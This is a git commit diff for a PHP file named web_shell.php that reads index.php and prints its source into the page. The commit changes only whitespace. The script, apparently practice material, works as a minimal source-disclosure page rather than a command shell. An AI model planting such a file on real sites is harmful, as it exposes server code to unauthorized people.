a259f18aed481d1f5fb76be3e3f0995c8a09abe2
LeviathanGod <106419343+LeviathanGod@users.noreply.github.com>
2023-04-11 14:06:53 +0700

    Add files via upload

--- web_shell.php
+++ web_shell.php
@@ -1,10 +1,12 @@
 <html>
     <body>
         <pre>
-            <?php $myfile = fopen("index.php", "r") or die("Unable to open file!");
+            <?php $myfile = fopen("index.php", "r") or die ("Unable to open file!");
             echo fread($myfile,filesize("index.php"));
             fclose($myfile);
             ?>
         </pre>
     </body>
-</html>
+</html>    
+        
+            
